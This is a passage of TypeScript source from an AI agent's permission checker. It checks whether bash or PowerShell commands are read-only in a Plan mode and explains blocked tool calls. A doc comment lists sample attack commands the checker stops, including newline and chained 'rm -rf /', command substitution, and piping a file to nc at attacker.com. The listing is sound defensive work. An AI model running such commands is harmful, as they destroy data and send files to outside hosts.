  const isPsCommand = looksLikePowerShell(trimmedCommand);

  if (isPsCommand && isPowerShellAvailable()) {
    debug('[Mode] Using PowerShell validator for command:', trimmedCommand);
    return getPowerShellRejectionReason(trimmedCommand, config);
  }

  // Step 2b: On Windows, reject CMD-only syntax early.
  // Commands like `if not exist`, `for /f`, `set VAR=` are Windows CMD builtins
  // that neither bash-parser nor path normalization can handle.
  if (isWindows && looksLikeCmdBuiltin(trimmedCommand)) {
    return {
      type: 'parse_error',
      error: 'Windows CMD syntax (if/for/set/copy/move) is not supported in Plan mode. Use PowerShell equivalents or bash commands instead.',
    };
  }

  // Step 2c: On Windows, normalize backslash paths for bash-parser.
  // bash-parser is POSIX and treats \ as escape chars, mangling Windows paths like
  // C:\Users\... into C:Users... or failing on trailing backslash-quote (\").
  const commandForParser = isWindows
    ? normalizeWindowsPathsForBashParser(trimmedCommand)
    : trimmedCommand;

  // Step 3: Use bash AST-based validation
  // This handles compound commands, pipelines, redirects, and substitutions properly
  const astResult = validateBashCommand(commandForParser, config.readOnlyBashPatterns);

  if (astResult.allowed) {
    debug('[Mode] Command allowed via AST validation:', trimmedCommand);
    return null;
  }

  // Step 3: Convert AST rejection reason to BashRejectionReason
  if (astResult.reason) {
    const reason = astResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'pipeline':
        // Convert to the legacy format for consistent error messages
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: reason.op,
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'command_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'process_substitution':
        return {
          type: 'dangerous_substitution',
          pattern: '<() or >()',
          explanation: reason.explanation,
        };

      case 'parameter_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '${} / $VAR',
          explanation: reason.explanation,
        };

      case 'env_assignment':
        return {
          type: 'dangerous_substitution',
          pattern: 'VAR=value',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        // Find relevant patterns to help the agent understand what format is expected
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }

      case 'compound_partial_fail':
        // Return info about which commands failed in a compound expression
        return {
          type: 'compound_partial_fail',
          failedCommands: reason.failedCommands,
          passedCommands: reason.passedCommands,
        };

      case 'background_execution':
        // Background execution with & operator - convert to dangerous_operator format
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };
    }
  }

  // Fallback: shouldn't reach here, but return generic rejection if we do
  debug('[Mode] Unexpected: AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: trimmedCommand,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(trimmedCommand, config),
  };
}

/**
 * Get detailed reason why a PowerShell command would be rejected.
 * Converts PowerShell validation results to BashRejectionReason format
 * for consistent error message handling.
 */
function getPowerShellRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const psResult = validatePowerShellCommand(command, config.readOnlyBashPatterns);

  if (psResult.allowed) {
    debug('[Mode] PowerShell command allowed via AST validation:', command);
    return null;
  }

  // Convert PowerShell rejection reason to BashRejectionReason format
  if (psResult.reason) {
    const reason = psResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'powershell_unavailable':
        // Fall back to bash validation if PowerShell is not available
        debug('[Mode] PowerShell unavailable, falling back to bash validation');
        return null;

      case 'pipeline':
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: '>',
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'subexpression':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'script_block':
        return {
          type: 'dangerous_substitution',
          pattern: '{ }',
          explanation: reason.explanation,
        };

      case 'invoke_expression':
        return {
          type: 'dangerous_substitution',
          pattern: 'Invoke-Expression',
          explanation: reason.explanation,
        };

      case 'dot_sourcing':
        return {
          type: 'dangerous_substitution',
          pattern: '. (dot-sourcing)',
          explanation: reason.explanation,
        };

      case 'assignment':
        return {
          type: 'dangerous_operator',
          operator: '=',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'background_execution':
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }
    }
  }

  // Fallback
  debug('[Mode] Unexpected: PowerShell AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: command,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(command, config),
  };
}

/**
 * Format actionable guidance for permission customization.
 * Tells the agent where to read/modify permissions.
 */
function formatPermissionGuidance(config: ToolCheckConfig): string {
  const lines: string[] = [];

  // Only include guidance if permission paths are available
  if (config.permissionPaths) {
    lines.push('');
    lines.push('To see what commands are allowed in Plan mode, read:');
    lines.push(`  • ${config.permissionPaths.workspacePath}`);
    lines.push(`  • ${config.permissionPaths.appDefaultPath}`);
    lines.push('');
    lines.push('To understand the permission system and how to customize:');
    lines.push(`  • ${config.permissionPaths.docsPath}`);
  }

  return lines.join('\n');
}

/**
 * Detect known upstream bash-parser tokenizer bugs.
 *
 * bash-parser has longstanding edge cases around quoted `$` / `)` handling
 * that can throw internal errors like `reducers.doubleQuoting`.
 */
function isKnownBashParserTokenizerBug(error: string): boolean {
  const lower = error.toLowerCase();
  return lower.includes('doublequoting') || lower.includes('reducers.doublequoting');
}

/**
 * Format a bash rejection reason into a user-friendly error message.
 * The message explains what was blocked and why, helping the agent understand the issue.
 * Includes actionable guidance on how to customize permissions.
 */
export function formatBashRejectionMessage(reason: BashRejectionReason, config: ToolCheckConfig): string {
  const modeSwitchHint = `Switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to run it.`;
  const permissionGuidance = formatPermissionGuidance(config);

  switch (reason.type) {
    case 'control_char':
      return `Bash command blocked: contains "${reason.char}" character. ${reason.explanation}. ${modeSwitchHint}`;

    case 'no_safe_pattern': {
      // Build a helpful message showing what patterns might be relevant
      const lines: string[] = [];
      lines.push(`Bash command \`${reason.command}\` is not in the read-only allowlist.`);

      // Prefer deterministic per-command guidance over fuzzy regex diagnostics.
      if (reason.commandHint) {
        lines.push('');
        lines.push(`Why: ${reason.commandHint.reason}`);
        if (reason.commandHint.context) {
          lines.push(`Context: ${reason.commandHint.context}`);
        }
        if (reason.commandHint.tryInstead && reason.commandHint.tryInstead.length > 0) {
          lines.push('Try instead:');
          for (const item of reason.commandHint.tryInstead) {
            lines.push(`  • ${item}`);
          }
        }
        if (reason.commandHint.example) {
          lines.push(`Example: \`${reason.commandHint.example}\``);
        }
      }

      // If we have mismatch analysis, show detailed diagnostics as heuristic guidance.
      if (reason.mismatchAnalysis) {
        const analysis = reason.mismatchAnalysis;
        lines.push('');

        // Show what matched and where it failed
        if (analysis.matchedPrefix) {
          lines.push(`Matched: \`${analysis.matchedPrefix}\` (${analysis.failedAtPosition} chars)`);
        }
        if (analysis.failedToken) {
          lines.push(`Failed at: \`${analysis.failedToken}\` (position ${analysis.failedAtPosition})`);
        }

        // Show the actionable suggestion if we have one
        if (analysis.suggestion) {
          lines.push('');
          lines.push(analysis.suggestion);
        }

        // Show which pattern was closest to matching (heuristic only)
        if (analysis.bestMatchPattern?.comment) {
          lines.push('');
          lines.push(`Closest allowlist hint (heuristic): ${analysis.bestMatchPattern.comment}`);
        }
      } else if (reason.relevantPatterns.length > 0) {
        // Fall back to showing relevant patterns if no mismatch analysis
        lines.push('');
        lines.push('Heuristic relevant pattern(s):');
        for (const pattern of reason.relevantPatterns) {
          // Show the pattern regex (simplified for readability)
          const patternDisplay = pattern.source.length > 80
            ? pattern.source.substring(0, 77) + '...'
            : pattern.source;
          lines.push(`  Pattern: \`${patternDisplay}\``);
          if (pattern.comment) {
            lines.push(`  → ${pattern.comment}`);
          }
        }
        lines.push('');
        lines.push('The command must match an allowlist pattern exactly from the start.');
      }

      // Add permission guidance for pattern-based rejections
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    case 'dangerous_operator':
      return `Bash command blocked: contains "${reason.operator}" operator. This ${reason.explanation}. Run commands separately or switch to Ask mode.`;

    case 'dangerous_substitution':
      return `Bash command blocked: contains ${reason.pattern} syntax. ${reason.explanation}. ${modeSwitchHint}`;

    case 'parse_error': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: could not parse command safely (${reason.error}).`);

      if (isKnownBashParserTokenizerBug(reason.error)) {
        lines.push('');
        lines.push('This looks like a known bash-parser tokenizer bug (not necessarily unsafe intent).');
        lines.push('Try using single quotes for regex/text arguments instead of double quotes.');
        lines.push('Problematic patterns often involve `$` (and sometimes `)`) inside double-quoted strings.');
        lines.push('Example: `rg -n "a|b|$|c" ...` → `rg -n \'a|b|$|c\' ...`');
      }

      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    case 'compound_partial_fail': {
      // Some commands in a compound expression failed
      const lines: string[] = [];
      lines.push('Bash command blocked: compound command contains unsafe operations.');
      lines.push('');
      if (reason.passedCommands.length > 0) {
        lines.push('✓ Allowed commands:');
        for (const cmd of reason.passedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      if (reason.failedCommands.length > 0) {
        lines.push('✗ Blocked commands (not in read-only allowlist):');
        for (const cmd of reason.failedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      // Add permission guidance for compound command failures
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    // New AST-based types (shouldn't reach here as they're converted above, but handle for completeness)
    case 'pipeline':
      return `Bash command blocked: contains pipeline (|). ${reason.explanation}. ${modeSwitchHint}`;

    case 'redirect':
      return `Bash command blocked: contains "${reason.op}" redirect. This ${reason.explanation}. ${modeSwitchHint}`;

    case 'command_expansion':
      return `Bash command blocked: contains command substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'process_substitution':
      return `Bash command blocked: contains process substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'parameter_expansion':
      return `Bash command blocked: contains variable expansion (\${} / $VAR). ${reason.explanation}. ${modeSwitchHint}`;

    case 'env_assignment':
      return `Bash command blocked: contains environment variable assignment. ${reason.explanation}. ${modeSwitchHint}`;

    case 'unsafe_command': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: \`${reason.command}\` is not in the read-only allowlist.`);
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }
  }
}

/**
 * Check if a Bash command is read-only using the given config.
 *
 * Uses AST-based validation to properly handle compound commands like
 * `git status && git log` - each part is validated separately, and the
 * command is allowed only if ALL parts pass.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. All simple commands match read-only patterns (including in compound commands)
 * 3. It does NOT contain redirects (>, >>, <) - these modify files
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 * 5. It does NOT run in background (&)
 *
 * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
 * - `git status && git log` is allowed (both commands are safe)
 * - `git log | head` is allowed (both commands are safe)
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
 * - `cat file | nc attacker.com` (nc not in allowlist)
 * - `ls $(rm -rf /)` (command substitution)
 */
/**
 * Check if a Bash command is read-only using a custom config.
 * Exported for testing purposes.
 *
 * @param command - The bash command to check
 * @param config - Tool check configuration with patterns
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
  // Use getBashRejectionReason which now uses AST-based validation
  // If no rejection reason, command is safe
  const rejection = getBashRejectionReason(command, config);
  return rejection === null;
}

/**
 * Check if a Bash command is read-only using the default safe mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommand(command: string): boolean {
  return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
}

/**
 * Extract the write target path from a bash command.
 * Returns the file path if the command writes to a file via redirect, null otherwise.
 *
 * Handles:
 * - Direct redirects: `echo "x" > /path/file`
 * - Codex subshell pattern: `/bin/zsh -lc "cat <<'EOF' > /path/file\n...\nEOF"`
 * - sh/bash -c variants: `bash -c "echo x > /path/file"`
 * - PowerShell Out-File: `@(...) | Out-File -FilePath 'path'`
 * - PowerShell Set-Content/Add-Content: `'...' | Set-Content -Path 'path'`
 */
export function extractBashWriteTarget(command: string): string | null {
  // Pattern 1: Quoted path after redirect (handles Codex's escaped quotes)
  // Matches: > "/path/to/file" or > \"/path/to/file\"
  const quotedPathMatch = command.match(/>\s*\\?"([^"]+)"/);
  if (quotedPathMatch?.[1] && quotedPathMatch[1] !== '/dev/null') {
    return quotedPathMatch[1];
  }

  // Pattern 2: shell -c/-lc with inner redirect (Codex pattern, unquoted paths)
  // Match: /bin/zsh -lc "... > /path/to/file ..." or bash -c '... > /path ...'
  const shellExecMatch = command.match(
    /(?:\/bin\/)?(?:zsh|bash|sh)\s+(?:-\w+\s+)*["'].*?>\s*([^\s'"\\]+)/
  );
  if (shellExecMatch?.[1] && shellExecMatch[1] !== '/dev/null') {
    return shellExecMatch[1];
  }

  // Pattern 3: Direct redirect - extract path after > or >>
  // Guard against non-shell uses like JavaScript arrow functions (=>).
  const directRedirectMatch = command.match(/(?:^|[^=<>])>{1,2}\s*([^\s;|&"'>=][^\s;|&"'>]*)/);
  if (directRedirectMatch?.[1] && directRedirectMatch[1] !== '/dev/null') {
    return directRedirectMatch[1];
  }

  // Pattern 4: PowerShell Out-File with -FilePath or -Path parameter
  // Matches: | Out-File -FilePath 'path' or | Out-File -Path "path"
  const outFileParamMatch = command.match(/Out-File\s+-(?:File)?Path\s+['"]([^'"]+)['"]/i);
  if (outFileParamMatch?.[1]) {
    return outFileParamMatch[1];
  }

  // Pattern 5: PowerShell Out-File with positional path (no -FilePath flag)
  // Matches: | Out-File 'path' or | Out-File "path"
  // Must not match -FilePath or -Encoding etc.
  const outFilePosMatch = command.match(/Out-File\s+['"]([^'"]+)['"]/i);
  if (outFilePosMatch?.[1] && !command.match(/Out-File\s+-\w/i)) {
    return outFilePosMatch[1];
  }

  // Pattern 6: PowerShell Set-Content or Add-Content with -Path parameter
  // Matches: | Set-Content -Path 'path' or | Add-Content -Path "path"
  const setContentMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+['"]([^'"]+)['"]/i);
  if (setContentMatch?.[1]) {
    return setContentMatch[1];
  }

  // Pattern 7: PowerShell Set-Content/Add-Content with escaped quotes (inside powershell.exe -Command "...")
  // When Codex wraps PS commands: powershell.exe -Command "Set-Content -Path \"C:\path\file\" -Value ..."
  // The -Path value uses escaped quotes \" which don't match Pattern 6's ['"] anchors.
  // This is a REQUIRED fallback: in the Codex agent context, PowerShell AST parsing
  // may be unavailable (isPowerShellAvailable() returns false), so extractPowerShellWriteTarget()
  // returns null and this regex is the only path extraction mechanism.
  const setContentEscapedMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+\\"([^"]+)\\"/i);
  if (setContentEscapedMatch?.[1]) {
    return setContentEscapedMatch[1];
  }

  // Pattern 8: PowerShell Out-File with escaped quotes (same wrapper scenario)
  const outFileEscapedMatch = command.match(/Out-File\s+-(?:File)?Path\s+\\"([^"]+)\\"/i);
  if (outFileEscapedMatch?.[1]) {
    return outFileEscapedMatch[1];
  }

  return null;
}

/**
 * Check if a command looks like it might be trying to write files.
 * Used to provide better error messages when write detection fails.
 */
export function looksLikePotentialWrite(command: string): boolean {
  // Shell redirects at token boundaries (avoid matching JS arrows like =>)
  const hasRedirectToken = /(?:^|[\s;|&()])\d*>>?(?![=>])/.test(command);
  // Common PowerShell write cmdlets
  const hasPowerShellWriteCmdlet = /(?:Out-File|Set-Content|Add-Content)\b/i.test(command);
  return hasRedirectToken || hasPowerShellWriteCmdlet;
}

/**
 * Get a helpful hint based on comparing target path to plans folder path.
 * Detects common mistakes and provides actionable guidance.
 */
export function getPathHint(targetPath: string, plansFolderPath: string, dataFolderPath?: string): string | null {
  const normalizedTarget = targetPath.replace(/\\/g, '/').toLowerCase();
  const normalizedPlans = plansFolderPath.replace(/\\/g, '/').toLowerCase();

  // Case: Writing to session folder but missing /plans/ or /data/
  if (normalizedTarget.includes('/sessions/') && !normalizedTarget.includes('/plans/') && !normalizedTarget.includes('/data/')) {
    return 'Hint: Write to the /plans/ or /data/ subfolder, not the session folder directly.';
  }

  // Case: Wrong session ID (use lowercase for comparison)
  const targetSessionMatch = normalizedTarget.match(/sessions\/([^/]+)/);
  const plansSessionMatch = normalizedPlans.match(/sessions\/([^/]+)/);
  if (targetSessionMatch && plansSessionMatch && targetSessionMatch[1] !== plansSessionMatch[1]) {
    // Get the original casing from plansFolderPath for display
    const originalSessionMatch = plansFolderPath.replace(/\\/g, '/').match(/sessions\/([^/]+)/);
    return `Hint: Wrong session ID. Current session is "${originalSessionMatch?.[1] ?? plansSessionMatch[1]}".`;
  }

  // Case: Writing to workspace root instead of session
  if (normalizedTarget.includes('/.craft-agent/workspaces/') && !normalizedTarget.includes('/sessions/')) {
    return 'Hint: Write to the session plans or data folder, not the workspace root.';
  }

  // Case: Writing outside .craft-agent entirely
  if (!normalizedTarget.includes('/.craft-agent/')) {
    return 'Hint: Files must be written to the session plans or data folder. Use plansFolderPath or dataFolderPath from <session_state>.';
  }

  return null;
}

/**
 * Check if an MCP tool is read-only using the given config
 */
function isReadOnlyMcpToolWithConfig(toolName: string, config: ToolCheckConfig): boolean {
  return config.readOnlyMcpPatterns.some(pattern => pattern.test(toolName));
}

/**
 * Check if an API call is allowed using the given config
 * Checks fine-grained endpoint rules (method + path pattern)
 */
function isApiCallAllowedWithConfig(method: string, path: string | undefined, config: ToolCheckConfig): boolean {
  const upperMethod = method.toUpperCase();

  // GET is always allowed
  if (upperMethod === 'GET') return true;

  // Check fine-grained endpoint rules (if path is available)
  if (path && config.allowedApiEndpoints) {
    for (const rule of config.allowedApiEndpoints) {
      if (rule.method === upperMethod && rule.pathPattern.test(path)) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Check if an API endpoint is allowed based on permissions context.
 * Used in 'ask' mode to auto-allow whitelisted API endpoints from permissions.json.
 *
 * @param method - HTTP method (GET, POST, etc.)
 * @param path - API endpoint path
 * @param permissionsContext - Context for loading custom permissions
 * @returns true if endpoint is allowed (GET or matches allowedApiEndpoints rules)
 */
export function isApiEndpointAllowed(
  method: string,
  path: string | undefined,
  permissionsContext?: PermissionsContext
): boolean {
  let config: ToolCheckConfig;

  if (permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  return isApiCallAllowedWithConfig(method, path, config);
}

/**
 * Tools that are always allowed in any mode (read-only by nature)
 */
const ALWAYS_ALLOWED_TOOLS = new Set([
  'Read', 'Glob', 'Grep',           // File reading
  'Task', 'TaskOutput',             // Agent orchestration
  'WebFetch', 'WebSearch',          // Web research
  'TodoWrite',                      // Task tracking
  'SubmitPlan',                     // Plan submission
  'LSP',                            // Language server (read-only)
  // Browser automation tool (canonical wrapper)
  'browser_tool',
]);

/**
 * Result type for tool permission checks
 */
export type ToolCheckResult =
  | { allowed: true; requiresPermission?: false }
  | { allowed: true; requiresPermission: true; description: string }
  | { allowed: false; reason: string };

/**
 * Centralized check: should a tool be allowed based on permission mode?
 *
 * This is the single source of truth for tool permissions.
 * Returns different results based on the permission mode:
 * - 'safe': Block writes entirely (no prompting)
 * - 'ask': Allow but may require permission for dangerous operations
 * - 'auto-edit': Allow but may require permission for non-edit dangerous operations
 * - 'allow-all': Allow everything
 */
export function shouldAllowToolInMode(
  toolName: string,
  toolInput: unknown,
  mode: PermissionMode,
  options?: {
    plansFolderPath?: string;
    dataFolderPath?: string;
    permissionsContext?: PermissionsContext;
  }
): ToolCheckResult {
  // Get config: merged custom if context provided, otherwise defaults
  let config: ToolCheckConfig;

  if (options?.permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(options.permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  // In 'allow-all' mode, all tools are allowed (no restrictions)
  if (mode === 'allow-all') {
    return { allowed: true };
  }

  // In 'ask' and 'auto-edit' modes, tools pass the mode gate. The prompt
  // decision pipeline decides which operations need user confirmation.
  if (mode === 'ask' || mode === 'auto-edit') {
    return { allowed: true };
  }

  // Safe mode: check against read-only allowlist

  // Always-allowed tools (read-only by nature)
  if (ALWAYS_ALLOWED_TOOLS.has(toolName)) {
    return { allowed: true };
  }

  // Check if tool name ends with an always-allowed tool (for MCP variants like mcp__plan__SubmitPlan)
  for (const allowedTool of ALWAYS_ALLOWED_TOOLS) {
    if (toolName.endsWith(`__${allowedTool}`)) {
      return { allowed: true };
    }
  }

  // Browser tool aliases (legacy browser_open/browser_snapshot/...)
  // are normalized centrally to avoid drift across permission checks.
  if (isBrowserToolNameOrAlias(toolName)) {
    return { allowed: true };
  }

  // Handle Bash - check if command is read-only
  // Uses detailed rejection reasons to provide helpful error messages
  if (toolName === 'Bash') {
    const input = toolInput as Record<string, unknown> | null;
    const command = input?.command;
    if (typeof command === 'string') {
      const rejection = getBashRejectionReason(command, config);
      if (!rejection) {
        // Command is safe - no rejection reason means it passed all checks
        return { allowed: true };
      }

      // Plans/data folder exception for bash/PowerShell writes.
      // Bash uses redirects: /bin/zsh -lc "cat <<'EOF' > /path/to/plans/file.md..."
      // PowerShell uses: @(...) | Out-File -FilePath 'C:\path\to\plans\file.md'
      // Only run this branch for likely write attempts to avoid false positives.
      const likelyWriteAttempt =
        (rejection.type === 'dangerous_operator' && rejection.operatorType === 'redirect') ||
        looksLikePotentialWrite(command);

      if (likelyWriteAttempt && (options?.plansFolderPath || options?.dataFolderPath)) {
        const targetPath = extractBashWriteTarget(command) ?? extractPowerShellWriteTarget(command);
        if (targetPath) {
          // Check plans folder with robust path containment (prevents sibling-prefix bypasses)
          if (options?.plansFolderPath && isPathWithinDirectory(targetPath, options.plansFolderPath)) {
            debug(`[Mode] Allowing write to plans folder: ${targetPath}`);
            return { allowed: true };
          }

          // Check data folder with robust path containment
          if (options?.dataFolderPath && isPathWithinDirectory(targetPath, options.dataFolderPath)) {
            debug(`[Mode] Allowing write to data folder: ${targetPath}`);
            return { allowed: true };
          }

          // Target path extracted but not in any allowed folder - give specific error with helpful hint
          debug(`[Mode] Write target "${targetPath}" is not in plans or data folder`);
          const pathHint = options?.plansFolderPath ? getPathHint(targetPath, options.plansFolderPath, options?.dataFolderPath) : null;
          const lines = [
            `Write blocked (Plan mode) - target not in allowed folders:`,
            ``,
            `  Target: ${targetPath}`,
          ];
          if (options?.plansFolderPath) {
            lines.push(`  Plans:  ${options.plansFolderPath}`);
          }
          if (options?.dataFolderPath) {
            lines.push(`  Data:   ${options.dataFolderPath}`);
          }
          if (pathHint) {
            lines.push(``, pathHint);
          }
          const plansHint = options?.plansFolderPath ? `For plans, write to: ${options.plansFolderPath}` : null;
          const dataHint = options?.dataFolderPath ? `For data output, write to: ${options.dataFolderPath}` : null;
          lines.push(
            ``,
            `Allowed paths in Plan mode:`,
            ...[plansHint, dataHint].filter(Boolean).map(p => `• ${p}`),
            `• Or ask the user to switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to enable writes anywhere`
          );
          return {
            allowed: false,
            reason: lines.join('\n'),
          };
        }
      }

      // Return detailed error message explaining exactly why the command was blocked
      return {
        allowed: false,
        reason: formatBashRejectionMessage(rejection, config),
      };
    }
    // No command provided - block with generic message
    return {
      allowed: false,
      reason: `Bash command is missing or invalid. Switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to run it.`,
    };
  }

  // Handle Write/Edit/MultiEdit/NotebookEdit - allow if targeting plans folder or allowedWritePaths
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit' || toolName === 'NotebookEdit') {
    const input = toolInput as Record<string, unknown> | null;
    const filePath = (input?.file_path ?? input?.notebook_path) as string | undefined;

    if (filePath) {
      // Check plans folder exception
      if (options?.plansFolderPath) {
        debug(`[Mode] Checking plans folder exception: path="${filePath}", plansDir="${options.plansFolderPath}"`);
        if (isPathWithinDirectory(filePath, options.plansFolderPath)) {
          debug(`[Mode] Allowing ${toolName} to plans folder`);
          return { allowed: true };
        }
      }

      // Check data folder exception
      if (options?.dataFolderPath && isPathWithinDirectory(filePath, options.dataFolderPath)) {
        debug(`[Mode] Allowing ${toolName} to data folder`);
        return { allowed: true };
      }

      // Check allowedWritePaths from permissions config
      if (config.allowedWritePaths && config.allowedWritePaths.length > 0) {
        if (matchesAllowedWritePath(filePath, config.allowedWritePaths)) {
          debug(`[Mode] Allowing ${toolName} via allowedWritePaths`);
          return { allowed: true };
        }
      }

      // Not in plans/data folder and not in allowedWritePaths - provide detailed rejection
      if (options?.plansFolderPath || options?.dataFolderPath) {
        debug(`[Mode] ${toolName} target "${filePath}" not in allowed folders or allowedWritePaths`);
        const pathHint = options?.plansFolderPath ? getPathHint(filePath, options.plansFolderPath, options?.dataFolderPath) : null;
        const lines = [
          `${toolName} blocked (Plan mode) - target not in allowed folders:`,
          ``,
          `  Target: ${filePath}`,
        ];
        if (options?.plansFolderPath) {
          lines.push(`  Plans:  ${options.plansFolderPath}`);
        }
        if (options?.dataFolderPath) {
          lines.push(`  Data:   ${options.dataFolderPath}`);
        }
        if (pathHint) {
          lines.push(``, pathHint);
        }
        const plansHint = options?.plansFolderPath ? `For plans, write to: ${options.plansFolderPath}` : null;
        const dataHint = options?.dataFolderPath ? `For data output, write to: ${options.dataFolderPath}` : null;
        lines.push(
          ``,
          `Allowed paths in Plan mode:`,
          ...[plansHint, dataHint].filter(Boolean).map(p => `• ${p}`),
          `• Or ask the user to switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to enable writes anywhere`
        );
        return {
          allowed: false,
          reason: lines.join('\n'),
        };
      }
    }
  }

  // Blocked tools (Write, Edit, MultiEdit, NotebookEdit)
  if (config.blockedTools.has(toolName)) {
    return {
      allowed: false,
      reason: getBlockReasonWithConfig(toolName, config)
    };
  }

  // Handle MCP tools - allow read-only, block write operations
  if (toolName.startsWith('mcp__')) {
    // Always allow documentation tools (read-only, always available)
    if (toolName.startsWith('mcp__craft-agents-docs__')) {
      return { allowed: true };
    }

    // Handle session-scoped tools - derive safe-mode behavior from canonical session-tools-core metadata
    if (toolName.startsWith('mcp__session__')) {
      const safeAllowedSessionTools = getSessionSafeAllowedToolNames({
        prefix: 'mcp__session__',
        includeDeveloperFeedback: FEATURE_FLAGS.developerFeedback,
      });

      if (safeAllowedSessionTools.has(toolName)) {
        return { allowed: true };
      }

      // Write/auth/admin session tools - blocked in Plan mode
      return {
        allowed: false,
        reason: `Session configuration changes are blocked in ${config.displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to create, update, or delete sources and agents.`
      };
    }

    // Handle API tools exposed via MCP (mcp__<source>__api_<name>)
    // These need endpoint-level permission checks, not just MCP read-only patterns
    if (toolName.includes('__api_')) {
      const input = toolInput as Record<string, unknown> | null;
      const method = (input?.method as string) || 'GET';
      const path = input?.path as string | undefined;
      if (isApiCallAllowedWithConfig(method, path, config)) {
        return { allowed: true };
      }
      return {
        allowed: false,
        reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to make changes.`
      };
    }

    if (isReadOnlyMcpToolWithConfig(toolName, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `MCP write operations are blocked in ${config.displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to make changes.`
    };
  }

  // Handle API tools - allow GET, block mutations unless endpoint is whitelisted
  if (toolName.startsWith('api_')) {
    const input = toolInput as Record<string, unknown> | null;
    const method = (input?.method as string) || 'GET';
    const path = input?.path as string | undefined;
    if (isApiCallAllowedWithConfig(method, path, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${config.shortcutHint}) to make changes.`
    };
  }

  // Default: allow other tools not explicitly handled
  return { allowed: true };
}

/**
 * Get a user-friendly message explaining why a tool is blocked (using config)
 */
function getBlockReasonWithConfig(toolName: string, config: ToolCheckConfig): string {
  const displayName = config.displayName;
  const shortcut = config.shortcutHint;

  if (toolName === 'Bash') {
